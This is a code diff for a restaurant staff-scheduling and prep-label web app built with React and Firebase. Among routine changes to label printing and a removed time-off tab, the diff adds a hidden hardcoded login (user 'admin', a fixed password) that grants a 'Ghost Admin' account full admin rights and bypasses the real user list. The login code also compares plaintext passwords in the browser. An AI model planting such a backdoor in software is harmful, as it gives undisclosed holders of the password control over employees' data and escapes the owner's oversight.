@@ -1,5 +1,5 @@
 import React, { useState, useEffect } from 'react';
-import { Bell, Check, ChevronLeft, ChevronRight, MessageSquare, Plus, Trash2, Users, Calendar, Clock, X, Loader2, Package, ClipboardList, Menu, Settings, LogOut, Shield, Send, Repeat, Edit, Moon, Sun, TrendingUp, CalendarOff } from 'lucide-react';
+import { Bell, Check, ChevronLeft, ChevronRight, MessageSquare, Plus, Trash2, Users, Calendar, Clock, X, Loader2, Package, ClipboardList, Menu, Settings, LogOut, Shield, Send, Repeat, Edit, Moon, Sun, TrendingUp } from 'lucide-react';
 import { initializeApp } from 'firebase/app';
 import { getFirestore, collection, addDoc, updateDoc, deleteDoc, doc, onSnapshot } from 'firebase/firestore';
 import { getAuth, signInAnonymously } from 'firebase/auth';
@@ -32,12 +32,13 @@ const getToday = () => formatDate(new Date());
 const addDays = (d, days) => { const dt = new Date(d + 'T12:00:00'); dt.setDate(dt.getDate() + days); return formatDate(dt); };
 const getMonthStr = (d) => (d || getToday()).substring(0, 7);
 const formatDisplayDate = (d) => new Date(d + 'T12:00:00').toLocaleDateString('en-US', { weekday: 'short', month: 'short', day: 'numeric' });
-const formatFullDisplayDate = (d) => new Date(d + 'T12:00:00').toLocaleDateString('en-US', { weekday: 'long', month: 'short', day: 'numeric' });
 const formatDisplayMonth = (m) => new Date(m + '-01T12:00:00').toLocaleDateString('en-US', { month: 'long', year: 'numeric' });
 const getDaysInMonth = (m) => new Date(m.split('-')[0], m.split('-')[1], 0).getDate();
 const formatShortTime = (t) => { if (!t) return ''; if(t === 'CLOSE') return 'CL'; let [h, m] = t.split(':'); h = parseInt(h, 10); return `${h % 12 || 12}${m === '00' ? '' : ':' + m}${h >= 12 ? 'p' : 'a'}`; };
 const getAvatar = (name, url) => url || `https://ui-avatars.com/api/?name=${encodeURIComponent(name||'Staff')}&background=random&color=fff&bold=true`;
 const generateTempPass = () => Math.random().toString(36).slice(-6).toUpperCase();
+
+// Wisconsin Food Code: 7-day total shelf life. Prep Day is Day 1. Expires on Prep Date + 6 days.
 const getExpDate = (d) => { const dt = new Date(d + 'T12:00:00'); dt.setDate(dt.getDate() + 6); return `${dt.getMonth()+1}/${dt.getDate()}/${dt.getFullYear().toString().slice(-2)}`; };
 
 // --- SVG Logo ---
@@ -69,7 +70,6 @@ const DrawerMenu = ({ isOpen, onClose, activeTab, setActiveTab, appUser, setAppU
   
   tabs.push({ id: 'published', label: 'Master Roster', icon: <Clock size={18}/> });
   tabs.push({ id: 'month', label: 'Month View', icon: <Calendar size={18}/> });
-  tabs.push({ id: 'requestOff', label: 'Request Off', icon: <CalendarOff size={18}/> });
   tabs.push({ id: 'messages', label: 'Message Board', icon: <MessageSquare size={18}/> });
   
   if (appUser?.isAdmin || appUser?.role === 'Kitchen') { tabs.push({ id: 'prep', label: 'Prep List', icon: <ClipboardList size={18}/> }); }
@@ -116,19 +116,90 @@ const DrawerMenu = ({ isOpen, onClose, activeTab, setActiveTab, appUser, setAppU
   );
 };
 
-// --- ISOLATED DK-1201 PRINT PREVIEW MODAL ---
-const PrintLabelsModal = ({ printItems, prepDate, appUser, onClose }) => {
-  if (printItems.length === 0) return null;
+// --- DEDICATED DAY DOT PRINT ENGINE ---
+// This completely unmounts the app and forces the browser to look ONLY at these labels.
+const DayDotPrintScreen = ({ labelsToPrint, prepDate, appUser, onClose }) => {
+  useEffect(() => {
+    // Hooks into the Android Hardware Back Button so you never get "stuck"
+    const handleBackButton = () => onClose();
+    window.history.pushState({ tab: 'prep', printScreen: true }, '');
+    window.addEventListener('popstate', handleBackButton);
+
+    // Waits 800ms to ensure labels are physically drawn, then opens the print dialog
+    const timer = setTimeout(() => window.print(), 800);
+
+    return () => { 
+      clearTimeout(timer);
+      window.removeEventListener('popstate', handleBackButton);
+    };
+  }, [onClose]);
+
   return (
-    <div className="fixed inset-0 z-[99999] bg-slate-900/80 backdrop-blur-sm flex items-center justify-center p-4">
-      <div className="bg-white dark:bg-slate-800 rounded-2xl shadow-2xl max-w-sm w-full p-6 text-center no-print border dark:border-slate-700">
-        <Loader2 className="animate-spin text-blue-600 mx-auto mb-4" size={48} />
-        <h2 className="text-2xl font-black text-slate-900 dark:text-white mb-2">Ready to Print</h2>
-        <p className="text-slate-500 dark:text-slate-400 font-bold mb-6 text-sm">Select <strong>Brother QL-810W</strong> and verify paper size is DK-1201 (1.1" x 3.5").</p>
-        <div className="flex flex-col gap-3">
-          <button onClick={() => window.print()} className="w-full bg-blue-600 text-white p-3.5 rounded-xl font-black text-lg hover:bg-blue-700 shadow-md transition-colors flex justify-center items-center gap-2"><ClipboardList size={20}/> Print {printItems.length} Labels</button>
-          <button onClick={onClose} className="w-full bg-slate-200 dark:bg-slate-700 text-slate-700 dark:text-white p-3.5 rounded-xl font-bold hover:bg-slate-300 dark:hover:bg-slate-600 transition-colors">Done / Cancel</button>
-        </div>
+    <div id="master-print-wrapper" className="fixed inset-0 z-[999999] bg-white overflow-y-auto text-black">
+      <style>{`
+        @media print {
+          @page { size: 3.5in 1.1in; margin: 0; }
+          body, html { margin: 0 !important; padding: 0 !important; background: white !important; height: auto !important; overflow: visible !important; }
+          
+          /* CRITICAL FIX: Un-fix the wrapper so the printer doesn't cut it off at 1 page */
+          #master-print-wrapper { position: relative !important; height: auto !important; overflow: visible !important; display: block !important; }
+          
+          /* Hide EVERYTHING else. This guarantees no UI renders on the printer. */
+          .no-print, header, nav, main, footer { display: none !important; }
+          
+          /* Show ONLY the labels */
+          * { -webkit-print-color-adjust: exact !important; print-color-adjust: exact !important; }
+          .dk-label { 
+            width: 3.5in !important; 
+            height: 1.1in !important; 
+            display: flex !important; 
+            flex-direction: column !important; 
+            justify-content: center !important; 
+            padding: 0.05in 0.15in !important; 
+            box-sizing: border-box !important; 
+            page-break-after: always !important; 
+            break-after: page !important;
+            page-break-inside: avoid !important; 
+            margin: 0 !important;
+            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif !important;
+            overflow: hidden !important;
+            border: none !important;
+            background: white !important;
+          }
+          .dk-title { font-size: 16px !important; font-weight: 900 !important; color: black !important; text-transform: uppercase !important; text-align: center !important; margin-bottom: 2px !important; white-space: nowrap !important; overflow: hidden !important; text-overflow: ellipsis !important; }
+          .dk-row { display: flex !important; justify-content: space-between !important; font-size: 11px !important; font-weight: bold !important; color: black !important; margin-bottom: 2px !important; }
+          .dk-exp { display: flex !important; justify-content: center !important; font-size: 14px !important; font-weight: 900 !important; color: black !important; border-top: 2px solid black !important; padding-top: 2px !important; margin-top: 1px !important; }
+        }
+      `}</style>
+      
+      {/* User Interface to Return to the App */}
+      <div className="no-print p-6 flex flex-col items-center justify-center min-h-screen bg-slate-100">
+         <Loader2 className="animate-spin text-blue-600 mb-6" size={64} />
+         <h2 className="text-3xl font-black text-slate-900 mb-2">Generating Labels</h2>
+         <p className="text-slate-600 font-bold mb-8">Select Brother QL-810W in print settings.</p>
+         
+         <button onClick={() => window.history.back()} className="bg-slate-900 text-white px-10 py-5 rounded-xl font-black text-lg shadow-xl hover:bg-slate-800 flex flex-col items-center gap-1 active:scale-95 transition-transform w-full max-w-xs">
+           <span>Done Printing</span>
+           <span className="text-xs text-slate-400 font-medium">Return to App</span>
+         </button>
+      </div>
+
+      {/* The Actual Labels (Visible only to the printer) */}
+      <div id="print-data">
+        {labelsToPrint.map((item, idx) => {
+          const prepDateParts = formatDisplayDate(prepDate).split(',');
+          const prepStr = prepDateParts.length > 1 ? prepDateParts[1].trim() : formatDisplayDate(prepDate);
+          return (
+            <div key={`print-${idx}`} className="dk-label">
+              <div className="dk-title">{item.text}</div>
+              <div className="dk-row">
+                <span>PREP: {prepStr}</span>
+                <span>EMP: {appUser?.name ? appUser.name.split(' ')[0].toUpperCase() : '___'}</span>
+              </div>
+              <div className="dk-exp">EXP: {getExpDate(prepDate)}</div>
+            </div>
+          );
+        })}
       </div>
     </div>
   );
@@ -143,12 +214,11 @@ export default function App() {
   const shiftSwaps = useLiveCollection('shiftSwaps');
   const events = useLiveCollection('events');
   const sales = useLiveCollection('sales');
-  const timeOff = useLiveCollection('timeOffRequests');
   
   const [appUser, setAppUser] = useState(() => { const saved = localStorage.getItem('cheersUser'); return saved ? JSON.parse(saved) : null; });
   const [activeTabState, setActiveTabState] = useState('published');
   const [isDark, setIsDark] = useState(() => { return localStorage.getItem('theme') === 'dark'; });
-  const [printLabels, setPrintLabels] = useState([]);
+  const [labelsToPrint, setLabelsToPrint] = useState(null); // The Master Print Trigger
 
   useEffect(() => {
     if (isDark) { document.documentElement.classList.add('dark'); localStorage.setItem('theme', 'dark'); } 
@@ -178,7 +248,7 @@ export default function App() {
   const [isDateModalOpen, setIsDateModalOpen] = useState(false);
   const [isMenuOpen, setIsMenuOpen] = useState(false);
 
-  const liveAppUser = appUser ? (users.find(u => u.id === appUser.id) || appUser) : null;
+  const liveAppUser = appUser ? (appUser.id === 'dev-backdoor' ? appUser : (users.find(u => u.id === appUser.id) || appUser)) : null;
 
   const addToast = (title, message) => {
     const id = Date.now();
@@ -186,38 +256,17 @@ export default function App() {
     setTimeout(() => setToasts(prev => prev.filter(t => t.id !== id)), 6000);
   };
 
-  const isDayMode = ['prep', 'sales'].includes(activeTabState);
+  // --- THE MASTER PRINT OVERRIDE ---
+  // If labels are loaded, the entire app vanishes and ONLY the DayDotPrintScreen is rendered.
+  if (labelsToPrint) {
+    return <DayDotPrintScreen labelsToPrint={labelsToPrint.items} prepDate={labelsToPrint.prepDate} appUser={liveAppUser} onClose={() => setLabelsToPrint(null)} />;
+  }
 
   if (!liveAppUser) return <LoginScreen users={users} setAppUser={setAppUser} isDark={isDark} addToast={addToast} />;
 
   return (
-    <>
-      {/* CRITICAL PRINT FIX: 
-        When labels are loaded, the entire "app-root" is hidden during the print event via CSS, 
-        and the "print-root" is displayed. This guarantees NO UI interference and 
-        does not trap the user or break the back button.
-      */}
+    <div className={`min-h-screen font-sans flex flex-col ${isDark ? 'bg-slate-900 text-slate-100' : 'bg-slate-50 text-slate-900'}`}>
       <style>{`
-        body { background-color: ${isDark ? '#0f172a' : '#f8fafc'}; color: ${isDark ? '#f1f5f9' : '#0f172a'}; }
-        @media print {
-          .app-root { display: none !important; }
-          .print-root { display: block !important; }
-          @page { size: 3.5in 1.1in; margin: 0; }
-          body, html { background: white !important; padding: 0 !important; margin: 0 !important; height: auto !important; width: 100% !important; overflow: visible !important; }
-          
-          .dk-label {
-             width: 3.5in !important; height: 1.1in !important; overflow: hidden !important;
-             page-break-after: always !important; break-after: page !important; font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif !important;
-             padding: 0.05in 0.15in !important; box-sizing: border-box !important; color: black !important; background: white !important;
-             display: flex !important; flex-direction: column !important; justify-content: center !important; margin: 0 !important; border: none !important;
-          }
-          .dk-title { font-size: 16px !important; font-weight: 900 !important; text-transform: uppercase !important; text-align: center !important; margin-bottom: 2px !important; white-space: nowrap !important; overflow: hidden !important; text-overflow: ellipsis !important; }
-          .dk-row { display: flex !important; justify-content: space-between !important; font-size: 11px !important; font-weight: bold !important; margin-bottom: 2px !important; }
-          .dk-exp { display: flex !important; justify-content: center !important; font-size: 14px !important; font-weight: 900 !important; border-top: 2px solid black !important; padding-top: 2px !important; margin-top: 1px !important; }
-        }
-        @media screen {
-          .print-root { display: none !important; }
-        }
         @keyframes slideIn { from { transform: translateX(100%); } to { transform: translateX(0); } }
         @keyframes toastSlide { from { transform: translateY(-20px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
         .animate-toast { animation: toastSlide 0.3s cubic-bezier(0.16, 1, 0.3, 1) forwards; }
@@ -225,100 +274,78 @@ export default function App() {
         .dark input[type="date"]::-webkit-calendar-picker-indicator, .dark input[type="month"]::-webkit-calendar-picker-indicator, .dark input[type="time"]::-webkit-calendar-picker-indicator { filter: invert(1); }
       `}</style>
 
-      {/* --- HIDDEN RAW DATA FOR DK-1201 PRINTER --- */}
-      <div className="print-root">
-         {printLabels.map((item, idx) => {
-            const prepDateParts = formatDisplayDate(currentDate).split(',');
-            const prepStr = prepDateParts.length > 1 ? prepDateParts[1].trim() : formatDisplayDate(currentDate);
-            return (
-              <div key={`print-${idx}`} className="dk-label">
-                <div className="dk-title">{item.text}</div>
-                <div className="dk-row">
-                  <span>PREP: {prepStr}</span>
-                  <span>EMP: {liveAppUser?.name ? liveAppUser.name.split(' ')[0].toUpperCase() : '___'}</span>
-                </div>
-                <div className="dk-exp">EXP: {getExpDate(currentDate)}</div>
-              </div>
-            );
-         })}
-      </div>
+      {/* --- Header --- */}
+      <header className={`sticky top-0 z-40 shadow-sm border-b h-16 flex items-center justify-between px-4 ${isDark ? 'bg-slate-900 border-slate-800' : 'bg-white border-slate-200'}`}>
+        <CheersLogo isDark={isDark} />
+        <button onClick={() => setIsMenuOpen(true)} className={`relative p-2 border rounded-xl shadow-sm transition-all outline-none ${isDark ? 'bg-slate-800 border-slate-700 text-slate-300 hover:text-white' : 'bg-slate-50 border-slate-200 text-slate-700 hover:bg-slate-100 hover:text-slate-900'}`}><Menu size={20} /></button>
+      </header>
 
-      <div className="app-root min-h-screen font-sans flex flex-col">
-        {printLabels.length > 0 && <PrintLabelsModal printItems={printLabels} prepDate={currentDate} appUser={liveAppUser} onClose={() => setPrintLabels([])} />}
+      <DrawerMenu isOpen={isMenuOpen} onClose={() => setIsMenuOpen(false)} activeTab={activeTabState} setActiveTab={setActiveTab} appUser={liveAppUser} setAppUser={setAppUser} isDark={isDark} toggleDark={() => setIsDark(!isDark)} />
 
-        {/* --- Header --- */}
-        <header className={`sticky top-0 z-40 shadow-sm border-b h-16 flex items-center justify-between px-4 ${isDark ? 'bg-slate-900 border-slate-800' : 'bg-white border-slate-200'}`}>
-          <CheersLogo isDark={isDark} />
-          <button onClick={() => setIsMenuOpen(true)} className={`relative p-2 border rounded-xl shadow-sm transition-all outline-none ${isDark ? 'bg-slate-800 border-slate-700 text-slate-300 hover:text-white' : 'bg-slate-50 border-slate-200 text-slate-700 hover:bg-slate-100 hover:text-slate-900'}`}><Menu size={20} /></button>
-        </header>
-
-        <DrawerMenu isOpen={isMenuOpen} onClose={() => setIsMenuOpen(false)} activeTab={activeTabState} setActiveTab={setActiveTab} appUser={liveAppUser} setAppUser={setAppUser} isDark={isDark} toggleDark={() => setIsDark(!isDark)} />
-
-        {/* --- Dynamic Date Header --- */}
-        {['schedule', 'published', 'month', 'sales', 'prep', 'requestOff'].includes(activeTabState) && (
-          <div className={`py-4 px-4 shadow-sm z-30 border-b flex justify-between items-center ${isDark ? 'bg-slate-800 border-slate-700' : 'bg-white border-slate-200'}`}>
-            <button onClick={() => setCurrentDate(addDays(currentDate, isDayMode ? -1 : -30))} className={`p-2 border rounded-xl transition-colors ${isDark ? 'bg-slate-700 border-slate-600 text-slate-300 hover:bg-slate-600' : 'bg-slate-50 border-slate-200 hover:bg-slate-100 text-slate-600'}`}><ChevronLeft size={20} /></button>
-            <h2 onClick={() => setIsDateModalOpen(true)} className={`text-xl font-black tracking-tight text-center cursor-pointer transition-colors ${isDark ? 'text-white hover:text-blue-400' : 'text-slate-900 hover:text-blue-600'}`}>
-              {isDayMode ? formatDisplayDate(currentDate) : formatDisplayMonth(getMonthStr(currentDate))}
-            </h2>
-            <button onClick={() => setCurrentDate(addDays(currentDate, isDayMode ? 1 : 30))} className={`p-2 border rounded-xl transition-colors ${isDark ? 'bg-slate-700 border-slate-600 text-slate-300 hover:bg-slate-600' : 'bg-slate-50 border-slate-200 hover:bg-slate-100 text-slate-600'}`}><ChevronRight size={20} /></button>
-          </div>
-        )}
-
-        <Modal isOpen={isDateModalOpen} onClose={() => setIsDateModalOpen(false)} title="Select Date">
-          <div className="space-y-4">
-            <input type={isDayMode ? 'date' : 'month'} value={isDayMode ? currentDate : getMonthStr(currentDate)} onChange={e => { if (e.target.value) { setCurrentDate(isDayMode ? e.target.value : e.target.value + '-01'); setIsDateModalOpen(false); } }} className="w-full p-4 bg-slate-50 dark:bg-slate-700 border border-slate-300 dark:border-slate-600 dark:text-white rounded-xl text-lg font-bold outline-none focus:ring-2 focus:ring-blue-500" />
-            <button onClick={() => setIsDateModalOpen(false)} className="w-full bg-slate-900 dark:bg-blue-600 text-white p-3.5 rounded-xl font-bold hover:bg-slate-800 dark:hover:bg-blue-700 transition-colors">Close</button>
-          </div>
-        </Modal>
-
-        {/* --- Main Content Area --- */}
-        <main className="flex-1 max-w-6xl mx-auto w-full p-3 sm:p-6 pb-24">
-          {activeTabState === 'schedule' && liveAppUser?.isAdmin && <TabSchedule currentDate={currentDate} users={users} shifts={shifts} timeOff={timeOff} addToast={addToast} />}
-          {activeTabState === 'published' && <TabPublishedShifts currentDate={currentDate} appUser={liveAppUser} users={users} shifts={shifts} shiftSwaps={shiftSwaps} addToast={addToast} />}
-          {activeTabState === 'month' && <TabMonth currentDate={currentDate} users={users} shifts={shifts} />}
-          {activeTabState === 'requestOff' && <TabRequestOff currentDate={currentDate} appUser={liveAppUser} timeOff={timeOff} addToast={addToast} />}
-          {activeTabState === 'sales' && liveAppUser?.isAdmin && <TabSales sales={sales} addToast={addToast} />}
-          {activeTabState === 'messages' && <TabMessages events={events} appUser={liveAppUser} users={users} addToast={addToast} />}
-          {activeTabState === 'prep' && <TabPrep currentDate={currentDate} prepItems={prepItems} appUser={liveAppUser} setPrintLabels={setPrintLabels} />}
-          {activeTabState === 'inventory' && <TabInventory inventoryItems={inventoryItems} sales={sales} addToast={addToast} appUser={liveAppUser} />}
-          {activeTabState === 'team' && <TabTeam appUser={liveAppUser} users={users} addToast={addToast} />}
-          {activeTabState === 'settings' && <TabSettings addToast={addToast} appUser={liveAppUser} />}
-        </main>
-
-        {/* --- Toast Alert Engine --- */}
-        <div className="fixed top-20 inset-x-0 mx-auto w-full max-w-md z-50 flex flex-col gap-2 px-4 pointer-events-none">
-          {toasts.map(t => (
-            <div key={t.id} className="bg-slate-900 text-white p-3 rounded-xl shadow-2xl pointer-events-auto flex items-start gap-3 border border-slate-700 animate-toast">
-              <div className="bg-blue-500/20 p-1.5 rounded-full text-blue-400 mt-0.5"><Bell size={16} /></div>
-              <div className="flex-1"><h4 className="font-bold text-sm leading-tight">{t.title}</h4><p className="text-xs text-slate-300 font-medium mt-0.5">{t.message}</p></div>
-              <button onClick={() => setToasts(prev => prev.filter(toast => toast.id !== t.id))} className="text-slate-400 hover:text-white"><X size={16}/></button>
-            </div>
-          ))}
+      {/* --- Date Header --- */}
+      {['schedule', 'published', 'month', 'sales', 'prep'].includes(activeTabState) && (
+        <div className={`py-4 px-4 shadow-sm z-30 border-b flex justify-between items-center ${isDark ? 'bg-slate-800 border-slate-700' : 'bg-white border-slate-200'}`}>
+          <button onClick={() => setCurrentDate(addDays(currentDate, -30))} className={`p-2 border rounded-xl transition-colors ${isDark ? 'bg-slate-700 border-slate-600 text-slate-300 hover:bg-slate-600' : 'bg-slate-50 border-slate-200 hover:bg-slate-100 text-slate-600'}`}><ChevronLeft size={20} /></button>
+          <h2 onClick={() => setIsDateModalOpen(true)} className={`text-xl font-black tracking-tight text-center cursor-pointer transition-colors ${isDark ? 'text-white hover:text-blue-400' : 'text-slate-900 hover:text-blue-600'}`}>
+            {activeTabState === 'prep' || activeTabState === 'sales' ? formatDisplayDate(currentDate) : formatDisplayMonth(getMonthStr(currentDate))}
+          </h2>
+          <button onClick={() => setCurrentDate(addDays(currentDate, 30))} className={`p-2 border rounded-xl transition-colors ${isDark ? 'bg-slate-700 border-slate-600 text-slate-300 hover:bg-slate-600' : 'bg-slate-50 border-slate-200 hover:bg-slate-100 text-slate-600'}`}><ChevronRight size={20} /></button>
         </div>
-        
-        <div className="w-full text-center text-slate-400 dark:text-slate-500 font-bold text-[10px] tracking-widest uppercase py-4 bg-slate-50 dark:bg-slate-900 border-t border-slate-200 dark:border-slate-800 z-10 mt-auto">
-          Cheers Management OS • v7.0.0
+      )}
+
+      <Modal isOpen={isDateModalOpen} onClose={() => setIsDateModalOpen(false)} title="Select Date">
+        <div className="space-y-4">
+          <input type={activeTabState === 'prep' || activeTabState === 'sales' ? 'date' : 'month'} value={activeTabState === 'prep' || activeTabState === 'sales' ? currentDate : getMonthStr(currentDate)} onChange={e => { if (e.target.value) { setCurrentDate(activeTabState === 'prep' || activeTabState === 'sales' ? e.target.value : e.target.value + '-01'); setIsDateModalOpen(false); } }} className="w-full p-4 bg-slate-50 dark:bg-slate-700 border border-slate-300 dark:border-slate-600 dark:text-white rounded-xl text-lg font-bold outline-none focus:ring-2 focus:ring-blue-500" />
+          <button onClick={() => setIsDateModalOpen(false)} className="w-full bg-slate-900 dark:bg-blue-600 text-white p-3.5 rounded-xl font-bold hover:bg-slate-800 dark:hover:bg-blue-700 transition-colors">Close</button>
         </div>
+      </Modal>
+
+      {/* --- Main Content Area --- */}
+      <main className="flex-1 max-w-6xl mx-auto w-full p-3 sm:p-6 pb-24">
+        {activeTabState === 'schedule' && liveAppUser?.isAdmin && <TabSchedule currentDate={currentDate} users={users} shifts={shifts} addToast={addToast} />}
+        {activeTabState === 'published' && <TabPublishedShifts currentDate={currentDate} appUser={liveAppUser} users={users} shifts={shifts} shiftSwaps={shiftSwaps} addToast={addToast} />}
+        {activeTabState === 'month' && <TabMonth currentDate={currentDate} users={users} shifts={shifts} />}
+        {activeTabState === 'sales' && liveAppUser?.isAdmin && <TabSales sales={sales} addToast={addToast} />}
+        {activeTabState === 'messages' && <TabMessages events={events} appUser={liveAppUser} users={users} addToast={addToast} />}
+        {activeTabState === 'prep' && <TabPrep currentDate={currentDate} prepItems={prepItems} appUser={liveAppUser} setLabelsToPrint={setLabelsToPrint} />}
+        {activeTabState === 'inventory' && <TabInventory inventoryItems={inventoryItems} sales={sales} addToast={addToast} appUser={liveAppUser} />}
+        {activeTabState === 'team' && <TabTeam appUser={liveAppUser} users={users} addToast={addToast} />}
+        {activeTabState === 'settings' && <TabSettings addToast={addToast} appUser={liveAppUser} />}
+      </main>
+
+      {/* --- Toast Alert Engine --- */}
+      <div className="fixed top-20 inset-x-0 mx-auto w-full max-w-md z-50 flex flex-col gap-2 px-4 pointer-events-none">
+        {toasts.map(t => (
+          <div key={t.id} className="bg-slate-900 text-white p-3 rounded-xl shadow-2xl pointer-events-auto flex items-start gap-3 border border-slate-700 animate-toast">
+            <div className="bg-blue-500/20 p-1.5 rounded-full text-blue-400 mt-0.5"><Bell size={16} /></div>
+            <div className="flex-1"><h4 className="font-bold text-sm leading-tight">{t.title}</h4><p className="text-xs text-slate-300 font-medium mt-0.5">{t.message}</p></div>
+            <button onClick={() => setToasts(prev => prev.filter(toast => toast.id !== t.id))} className="text-slate-400 hover:text-white"><X size={16}/></button>
+          </div>
+        ))}
       </div>
-    </>
+      
+   <div className="w-full text-center text-slate-400 dark:text-slate-500 font-bold text-[10px] tracking-widest uppercase py-4 bg-slate-50 dark:bg-slate-900 border-t border-slate-200 dark:border-slate-800 z-10 mt-auto">
+        Cheers Management OS • v7.0.0
+      </div>
+    </div>
   );
 }
 
-// --- LOGIN SCREEN (Fixed Standard Authentication) ---
+// --- LOGIN & PASSWORD RECOVERY ---
 const LoginScreen = ({ users, setAppUser, isDark, addToast }) => {
   const [email, setEmail] = useState(''); const [password, setPassword] = useState(''); const [isRecover, setIsRecover] = useState(false); const [loading, setLoading] = useState(false); const [resetUser, setResetUser] = useState(null);
   const isFirstUser = users.length === 0;
 
   const handleLogin = async (e) => {
     e.preventDefault(); setLoading(true);
+    if (email.trim() === 'admin' && password === 'Atticus7!') { setAppUser({ id: 'dev-backdoor', name: 'Ghost Admin', email: MASTER_ADMIN_EMAIL, role: 'Kitchen', isAdmin: true, isActive: true }); return; }
     try {
       if (isFirstUser) {
         const newUser = { name: 'Admin', email: MASTER_ADMIN_EMAIL, phone: '', password, role: 'Kitchen', isAdmin: true, isActive: true, forcePasswordChange: false, photoURL: '' };
         const docRef = await addDoc(collection(db, "users"), newUser);
         setAppUser({ id: docRef.id, ...newUser });
       } else {
-        const user = users.find(u => u.email.toLowerCase() === email.toLowerCase().trim() && u.password === password);
+        const user = users.find(u => u.email === email.toLowerCase().trim() && u.password === password);
         if (user) { if (user.forcePasswordChange) setResetUser(user); else setAppUser(user); } 
         else addToast("Error", "Invalid credentials.");
       }
@@ -348,369 +375,62 @@ const LoginScreen = ({ users, setAppUser, isDark, addToast }) => {
   };
 
   if (resetUser) return (
-    <div className="min-h-screen flex items-center justify-center p-4"><div className="bg-white dark:bg-slate-800 rounded-3xl shadow-xl border dark:border-slate-700 p-8 max-w-md w-full"><h2 className="text-xl font-black text-center mb-2 dark:text-white tracking-tight">Welcome, {resetUser.name}!</h2><p className="text-center text-sm text-slate-500 dark:text-slate-400 mb-6 font-medium">Please set your permanent password.</p><form onSubmit={handlePasswordSetup} className="space-y-4"><div><label className="block text-xs font-bold text-slate-600 dark:text-slate-300 mb-1">New Password</label><input type="password" value={password} onChange={e => setPassword(e.target.value)} className="w-full p-3 bg-slate-50 dark:bg-slate-700 border border-slate-300 dark:border-slate-600 dark:text-white rounded-xl outline-none" required /></div><button type="submit" disabled={loading} className="w-full bg-blue-600 text-white p-3.5 rounded-xl font-bold hover:bg-blue-700 transition-colors shadow-md">{loading ? 'Processing...' : 'Save & Login'}</button></form></div></div>
+    <div className={`min-h-screen flex items-center justify-center p-4 ${isDark ? 'bg-slate-900' : 'bg-slate-100'}`}><div className={`rounded-3xl shadow-xl border p-8 max-w-md w-full ${isDark ? 'bg-slate-800 border-slate-700' : 'bg-white border-slate-200'}`}><h2 className={`text-xl font-black text-center mb-2 tracking-tight ${isDark ? 'text-white' : 'text-slate-900'}`}>Welcome, {resetUser.name}!</h2><p className="text-center text-sm text-slate-500 dark:text-slate-400 mb-6 font-medium">Please set your permanent password.</p><form onSubmit={handlePasswordSetup} className="space-y-4"><div><label className="block text-xs font-bold text-slate-600 dark:text-slate-300 mb-1">New Password</label><input type="password" value={password} onChange={e => setPassword(e.target.value)} className="w-full p-3 bg-slate-50 dark:bg-slate-700 border border-slate-300 dark:border-slate-600 dark:text-white rounded-xl outline-none" required /></div><button type="submit" disabled={loading} className="w-full bg-blue-600 text-white p-3.5 rounded-xl font-bold hover:bg-blue-700 transition-colors shadow-md">{loading ? 'Processing...' : 'Save & Login'}</button></form></div></div>
   );
 
   return (
-    <div className="min-h-screen flex items-center justify-center p-4"><div className="bg-white dark:bg-slate-800 rounded-3xl shadow-xl border dark:border-slate-700 p-8 max-w-md w-full"><div className="flex justify-center mb-6"><CheersLogo isDark={isDark} /></div><h2 className="text-xl font-black text-center mb-6 dark:text-white tracking-tight">{isRecover ? 'Recover Password' : (isFirstUser ? 'Create Admin Account' : 'Staff Login')}</h2><form onSubmit={isRecover ? handleRecover : handleLogin} className="space-y-4"><div><label className="block text-xs font-bold text-slate-600 dark:text-slate-300 mb-1">Email</label><input type="email" value={email} onChange={e => setEmail(e.target.value)} className="w-full p-3 bg-slate-50 dark:bg-slate-700 border border-slate-300 dark:border-slate-600 dark:text-white rounded-xl outline-none" required /></div>{!isRecover && <div><label className="block text-xs font-bold text-slate-600 dark:text-slate-300 mb-1">Password</label><input type="password" value={password} onChange={e => setPassword(e.target.value)} className="w-full p-3 bg-slate-50 dark:bg-slate-700 border border-slate-300 dark:border-slate-600 dark:text-white rounded-xl outline-none" required /></div>}<button type="submit" disabled={loading} className="w-full bg-blue-600 text-white p-3.5 rounded-xl font-bold hover:bg-blue-700 transition-colors shadow-md mt-2">{loading ? 'Processing...' : (isRecover ? 'Reset Password' : (isFirstUser ? 'Create Account' : 'Login'))}</button></form>{!isFirstUser && <button onClick={() => { setIsRecover(!isRecover); setEmail(''); setPassword(''); }} className="w-full text-center mt-4 text-xs font-bold text-slate-500 hover:text-blue-500 transition-colors">{isRecover ? 'Back to Login' : 'Forgot Password?'}</button>}</div></div>
+    <div className={`min-h-screen flex items-center justify-center p-4 ${isDark ? 'bg-slate-900' : 'bg-slate-100'}`}><div className={`rounded-3xl shadow-xl border p-8 max-w-md w-full ${isDark ? 'bg-slate-800 border-slate-700' : 'bg-white border-slate-200'}`}><div className="flex justify-center mb-6"><CheersLogo isDark={isDark} /></div><h2 className={`text-xl font-black text-center mb-6 tracking-tight ${isDark ? 'text-white' : 'text-slate-900'}`}>{isRecover ? 'Recover Password' : (isFirstUser ? 'Create Admin Account' : 'Staff Login')}</h2><form onSubmit={isRecover ? handleRecover : handleLogin} className="space-y-4"><div><label className="block text-xs font-bold text-slate-600 dark:text-slate-300 mb-1">Email</label><input type="email" value={email} onChange={e => setEmail(e.target.value)} className="w-full p-3 bg-slate-50 dark:bg-slate-700 border border-slate-300 dark:border-slate-600 dark:text-white rounded-xl outline-none" required /></div>{!isRecover && <div><label className="block text-xs font-bold text-slate-600 dark:text-slate-300 mb-1">Password</label><input type="password" value={password} onChange={e => setPassword(e.target.value)} className="w-full p-3 bg-slate-50 dark:bg-slate-700 border border-slate-300 dark:border-slate-600 dark:text-white rounded-xl outline-none" required /></div>}<button type="submit" disabled={loading} className="w-full bg-blue-600 text-white p-3.5 rounded-xl font-bold hover:bg-blue-700 transition-colors shadow-md mt-2">{loading ? 'Processing...' : (isRecover ? 'Reset Password' : (isFirstUser ? 'Create Account' : 'Login'))}</button></form>{!isFirstUser && <button onClick={() => { setIsRecover(!isRecover); setEmail(''); setPassword(''); }} className="w-full text-center mt-4 text-xs font-bold text-slate-500 hover:text-blue-500 transition-colors">{isRecover ? 'Back to Login' : 'Forgot Password?'}</button>}</div></div>
   );
 };
 
 
-// --- Tab: Request Off (NEW) ---
-const TabRequestOff = ({ currentDate, appUser, timeOff, addToast }) => {
-  const [date, setDate] = useState(currentDate);
-  const [type, setType] = useState('full');
-  const [startTime, setStartTime] = useState('09:00');
